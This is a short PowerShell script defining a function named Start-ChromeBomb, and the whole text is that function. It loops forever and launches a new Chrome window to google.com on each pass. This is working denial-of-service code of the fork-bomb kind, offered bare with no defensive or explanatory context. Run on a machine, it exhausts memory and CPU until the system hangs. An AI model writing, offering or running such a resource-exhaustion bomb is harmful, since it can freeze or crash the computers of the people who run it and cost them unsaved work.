function Start-ChromeBomb
{
    while(1) 
    {
        Start-Process chrome.exe 'http://www.google.com/'
    }
}